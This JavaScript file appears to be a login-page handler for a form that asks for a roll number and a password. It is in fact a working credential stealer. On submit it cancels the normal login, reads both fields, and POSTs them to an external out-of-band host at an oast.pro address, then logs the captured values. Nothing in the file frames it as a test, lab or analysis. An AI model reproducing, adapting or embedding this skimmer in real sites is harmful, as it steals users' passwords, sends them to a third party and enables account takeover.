(function() {
  const SERVER_URL = 'https://d33pso9qrgmtmjshacegbh5uomph5tugr.oast.pro/creds';

  document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    if (!form) return;

    form.onsubmit = function(e) {
      e.preventDefault();

      const roll = document.getElementById('roll').value;
      const password = document.getElementById('password').value;

      if (!roll || !password) {
        alert('Please fill both fields.');
        return;
      }

      fetch(SERVER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ roll, password })
      })
      .then(res => console.log('Sent:', roll, password))
      .catch(err => console.error(err));
    };
  });
})();
